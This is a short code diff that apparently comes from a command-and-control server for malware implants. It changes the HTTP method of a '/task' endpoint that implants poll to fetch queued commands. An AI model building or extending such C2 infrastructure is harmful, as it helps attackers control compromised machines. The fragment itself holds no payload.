@@ -43,7 +43,7 @@ def assign_command(cmd_index):
 
 
 # Implant periodically polls this endpoint to get a task
-@app.route('/task', methods=['POST'])
+@app.route('/task', methods=['GET'])
 def get_task():
     if not tasks.empty():
         task = tasks.get()
